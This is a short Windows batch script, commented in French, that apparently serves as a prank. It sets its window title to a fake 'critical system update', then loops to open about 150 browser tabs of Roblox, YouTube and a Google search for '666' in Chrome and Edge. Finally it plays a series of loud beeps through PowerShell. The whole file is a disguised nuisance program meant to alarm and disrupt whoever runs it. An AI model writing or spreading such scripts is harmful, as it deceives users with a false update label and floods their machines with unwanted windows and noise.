@echo off
title MISE A JOUR SYSTEME CRITIQUE
color 0a

:: 1. Ouvre 50 onglets avec différentes pages
for /l %%x in (1, 1, 50) do (
    start chrome "https://www.roblox.com"
    start msedge "https://www.youtube.com"
    start chrome "https://www.google.com/search?q=666"
)

:: 2. Joue un son strident en boucle (sans ouvrir de fenêtre)
powershell -c "1..10 | ForEach-Object { [console]::beep(1000, 500) }"